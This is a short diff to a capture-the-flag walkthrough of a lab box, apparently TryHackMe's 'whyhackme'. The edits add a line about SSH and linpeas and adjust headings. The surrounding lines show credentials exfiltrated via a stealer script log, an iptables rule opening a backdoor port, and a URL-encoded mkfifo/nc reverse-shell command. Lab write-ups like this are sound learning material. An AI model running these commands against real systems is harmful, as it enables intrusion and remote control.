@@ -120,6 +120,9 @@ log from http server
 10.10.240.147 - - [11/Jan/2024 03:53:19] "GET /stealer4.js?jack:WhyIsMyPasswordSoStrongIDK HTTP/1.1" 200 -
 
 <h2> PrivEscalation lateral moving </h2>
+
+get access via ssh as jack run linpeas and get this
+
 ╔══════════╣ Checking 'sudo -l', /etc/sudoers, and /etc/sudoers.d
 ╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#sudo-and-suid                            
 Matching Defaults entries for jack on ubuntu:                                                               
@@ -162,13 +165,13 @@ Content-Type: text/html
 
 uid=33(www-data) gid=1003(h4ck3d) groups=1003(h4ck3d)
 
-<h2> Open Backdoor Port </h2>
+<h3> Open Backdoor Port </h3>
   
 jack@ubuntu:/opt$ sudo /usr/sbin/iptables -I INPUT -p tcp --dport 41312 -j ACCEPT
 jack@ubuntu:/opt$ ss -tlnup | grep "41312"
 tcp   LISTEN 0      511               0.0.0.0:41312        0.0.0.0:*        
 
-<h2>Get Reverse Shell </h2>
+<h3>Get Reverse Shell </h3>
 
 https://whyhackme.thm:41312/cgi-bin/5UP3r53Cr37.py?key=48pfPHUrj4pmHzrC&iv=VZukhsCo8TlTXORN&cmd=rm%20%2Ftmp%2Ff%3Bmkfifo%20%2Ftmp%2Ff%3Bcat%20%2Ftmp%2Ff%7C%2Fbin%2Fbash%20-i%202%3E%261%7Cnc%2010.x.x.x%204444%20%3E%2Ftmp%2Ff
 
